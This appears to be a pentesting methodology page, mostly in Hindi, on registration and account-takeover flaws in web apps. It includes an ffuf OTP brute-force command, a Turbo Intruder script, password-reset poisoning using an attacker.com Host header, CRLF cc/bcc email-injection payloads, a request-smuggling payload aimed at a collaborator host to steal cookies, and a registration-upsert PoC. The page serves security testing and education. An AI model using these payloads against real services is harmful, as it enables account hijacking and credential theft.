# रजिस्ट्रेशन & टेकओवर कमजोरियाँ

{{#include ../banners/hacktricks-training.md}}

## Registration Takeover

### Duplicate Registration

- किसी मौजूदा username का उपयोग करके अकाउंट बनने की कोशिश करें
- email बदलकर चेक करें:
- uppercase
- +1@
- email में कुछ dot जोड़ें
- email नाम में स्पेशल करैक्टर (%00, %09, %20)
- email के बाद ब्लैक करैक्टर्स डालें: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- email provider canonicalization ट्रिक्स आज़माएँ (service-dependent):
- Gmail dots और subaddressing को इग्नोर करता है: `victim+1@gmail.com`, `v.ic.tim@gmail.com` ये `victim@gmail.com` पर डिलीवर होते हैं
- कुछ providers local-part में case-insensitive होते हैं
- कुछ providers unicode confusables स्वीकार करते हैं। homoglyphs और soft hyphen `\u00AD` को local-part में आज़माएँ
- इनका ग़लत उपयोग करके: uniqueness checks bypass करें, duplicate accounts/workspace invites हासिल करें, या victim sign‑ups को ब्लॉक कर के (temporary DoS) takeover की तैयारी करें

### Username Enumeration

चेक करें कि क्या आप पता लगा सकते हैं कि कब कोई username ऐप में पहले से रजिस्टर है।

- अलग-अलग error messages या HTTP status codes
- timing differences (मौजूद user IdP/DB lookup ट्रिगर कर सकता है)
- रजिस्ट्रेशन फॉर्म का profile data autofill होना ज्ञात emails के लिए
- team/invite flows चेक करें: email डालने पर यह पता चल सकता है कि account मौजूद है या नहीं

### Password Policy

User बनाने पर password policy चेक करें (देखें क्या आप weak passwords इस्तेमाल कर सकते हैं)।\
ऐसी स्थिति में आप credentials bruteforce करने की कोशिश कर सकते हैं।

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)to learn how to attempt account takeovers or extract information via **SQL Injections** in registry forms.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Change Email

रजिस्टर होने के बाद email बदलने की कोशिश करें और चेक करें कि यह बदलाव सही तरीके से validate होता है या आप arbitrary emails पर बदल सकते हैं।

### More Checks

- चेक करें क्या आप **disposable emails** (mailinator, yopmail, 1secmail, आदि) का उपयोग कर सकते हैं या subaddressing जैसे `victim+mailinator@gmail.com` के साथ blocklist बायपास कर सकते हैं
- **Long** **password** (>200) से **DoS** हो सकता है
- **Check rate limits on account creation**
- Use username@**burp_collab**.net और **callback** analyze करें
- अगर phone number verification इस्तेमाल हो रहा है, तो phone parsing/injection edge cases चेक करें

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

## Weak Email/Phone Verification (OTP/Magic Link)

Registration flows अक्सर ownership verify करने के लिए numeric OTP या magic-link token का इस्तेमाल करते हैं। सामान्य कमजोरियाँ:

- Guessable या छोटा OTP (4–6 digits) बिना प्रभावी rate limiting या IP/device tracking के। parallel guesses और header/IP rotation आज़माएँ।
- OTP actions या accounts के बीच reuse होता है, या specific user/action से बंधा नहीं होता (उदा., वही कोड login और signup दोनों के लिए काम करता है, या email बदलने के बाद भी काम करता है)।
- Multi-value smuggling: कुछ बैकएंड कई codes स्वीकार करते हैं और किसी भी मैच करने वाले को वैरिफाई कर देते हैं। आज़माएँ:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: wrong vs expired vs wrong-user codes को status/message/body length से अलग करें।
- Tokens success के बाद या password/email change के बाद invalidate नहीं होते।
- Verification token user agent/IP से नहीं बंधा होता, जिससे attacker-controlled pages से cross-origin completion संभव हो सकता है।

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
समानांतर/एकसाथ अनुमान करके क्रमिक लॉकआउट को बायपास करना (Burp में Turbo Intruder का उपयोग करें):

<details>
<summary>6‑digit OTP attempts को flood करने के लिए Turbo Intruder snippet</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)

def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: एक ही वैध OTP को दोनों sessions में एक साथ submit करें; कभी-कभी एक session attacker का verified account बन जाता है जबकि victim का flow भी सफल हो जाता है।
- Also test Host header poisoning on verification links (same as reset poisoning below) ताकि आप attacker controlled host पर verification को leak या पूरा कर सकें।

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

एक शक्तिशाली समस्या तब होती है जब attacker पीड़ित के email पर पीड़ित के account बनाने से पहले कार्रवाई करता है, और बाद में फिर से पहुंच हासिल कर लेता है।

Key techniques to test (adapt to the target’s flows):

- Classic–Federated Merge
- Attacker: registers a classic account with victim email and sets a password
- Victim: later signs up with SSO (same email)
- Insecure merges may leave both parties logged in or resurrect the attacker’s access
- Unexpired Session Identifier
- Attacker: creates account and holds a long‑lived session (don’t log out)
- Victim: recovers/sets password and uses the account
- Test if old sessions stay valid after reset or MFA enablement
- Trojan Identifier
- Attacker: adds a secondary identifier to the pre‑created account (phone, additional email, or links attacker’s IdP)
- Victim: resets password; attacker later uses the trojan identifier to reset/login
- Unexpired Email Change
- Attacker: initiates email‑change to attacker mail and withholds confirmation
- Victim: recovers the account and starts using it
- Attacker: later completes the pending email‑change to steal the account
- Non‑Verifying IdP
- Attacker: uses an IdP that does not verify email ownership to assert `victim@…`
- Victim: signs up via classic route
- Service merges on email without checking `email_verified` or performing local verification

Practical tips

- Web/mobile bundles से flows और endpoints इकट्ठा करें। classic signup, SSO linking, email/phone change, और password reset endpoints खोजें।
- ऐसे realistic automation बनाएं जो sessions को alive रखे जब आप अन्य flows टेस्ट कर रहे हों।
- For SSO tests, एक test OIDC provider खड़ा करें और victim address के लिए `email` claims और `email_verified=false` वाले tokens जारी करें ताकि जाँच सकें कि RP unverified IdPs पर भरोसा करता है या नहीं।
- किसी भी password reset या email change के बाद verify करें कि:
- सभी अन्य sessions और tokens invalidated किए गए हैं,
- pending email/phone change क्षमताएँ cancel कर दी गई हैं,
- पहले linked IdPs/emails/phones को फिर से verify किया गया है।

Note: इन técnicas की विस्तृत methodology और case studies Microsoft की pre‑hijacking research में document की गई हैं (References देखें)।

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Request password reset to your email address
2. Click on the password reset link
3. Don’t change password
4. Click any 3rd party websites(eg: Facebook, twitter)
5. Intercept the request in Burp Suite proxy
6. जांचें कि referer header password reset token को leak कर रहा है या नहीं।

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercept the password reset request in Burp Suite
2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward the request with the modified header\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Look for a password reset URL based on the _host header_ like : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR on API Parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. हमलावर को अपने खाते से लॉगिन करके **Change password** फीचर पर जाना होगा।
2. Burp Suite शुरू करें और अनुरोध को Intercept करें
3. इसे repeater टैब पर भेजें और पैरामीटर एडिट करें : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Password reset token को हर बार randomly generated और unique होना चाहिए।\
यह पता लगाने की कोशिश करें कि token expire होता है या हमेशा वही रहता है; कुछ मामलों में generation algorithm कमजोर होती है और guess की जा सकती है। नीचे दिए गए वैरिएबल्स algorithm द्वारा उपयोग किए जा सकते हैं।

- Timestamp
- UserID
- Email of User
- Firstname and Lastname
- Date of Birth
- Cryptography
- Number only
- Small token sequence ( characters between \[A-Z,a-z,0-9])
- Token reuse
- Token expiration date

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. API/UI का उपयोग करके किसी विशेष ईमेल के लिए password reset request trigger करें, उदाहरण: test@mail.com
2. server response का निरीक्षण करें और `resetToken` की जाँच करें
3. उसके बाद token को इस तरह के URL में उपयोग करें: `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. सिस्टम पर ऐसे username के साथ रजिस्टर करें जो victim के username के समान हो, पर username के पहले और/या बाद में white spaces डालें। उदाहरण: `"admin "`
2. अपने malicious username से password reset request करें।
3. आपके ईमेल पर भेजे गए token का उपयोग करके victim का password reset करें।
4. नए पासवर्ड से victim अकाउंट में लॉगिन करें।

The platform CTFd was vulnerable to this attack.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. यदि cookies parent domain पर scoped हैं (`*.domain.com`), तो application या किसी subdomain में XSS खोजें
2. Leak the current **sessions cookie**
3. उस cookie का उपयोग करके user के रूप में authenticate करें

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. HTTP Request Smuggling का प्रकार (CL, TE, CL.TE) पता करने के लिए **smuggler** का उपयोग करें\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. एक ऐसा request तैयार करें जो `POST / HTTP/1.1` को निम्नलिखित data से overwrite कर दे:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` जिसका उद्देश्य victims को burpcollab की ओर open redirect करना और उनकी cookies steal करना है\
3. Final request could look like the following
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
HackerOne पर इस बग का exploit करने की रिपोर्टें:\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Account Takeover via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. CSRF के लिए payload बनाएं, उदाहरण: “HTML form with auto submit for a password change”
2. payload भेजें

### Account Takeover via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token का उपयोग किसी उपयोगकर्ता को प्रमाणित करने के लिए किया जा सकता है।

- JWT में दूसरे User ID / Email सेट करें
- कमज़ोर JWT signature की जाँच करें


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

कुछ signup handlers तब upsert करते हैं जब दिया गया email पहले से मौजूद होता है। यदि endpoint एक minimal body (email और password) स्वीकार करता है और ownership verification लागू नहीं करता, तो पीड़ित का email भेजने पर उनका password pre-auth overwrite हो जाएगा।

- Discovery: bundled JS (या mobile app traffic) से endpoint नाम इकट्ठा करें, फिर base paths जैसे /parents/application/v4/admin/FUZZ को ffuf/dirsearch का उपयोग करके fuzz करें.
- Method hints: एक GET जो "Only POST request is allowed." जैसा संदेश लौटाता है अक्सर सही verb और कि JSON body अपेक्षित है यह संकेत देता है.
- Minimal body observed in the wild:
```json
{"email":"victim@example.com","password":"New@12345"}
```
उदाहरण PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
प्रभाव: Full Account Takeover (ATO) without any reset token, OTP, or email verification.

## संदर्भ

- [कैसे मैंने एक Critical Password Reset Bug (Registration upsert ATO) पाया](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)

{{#include ../banners/hacktricks-training.md}}
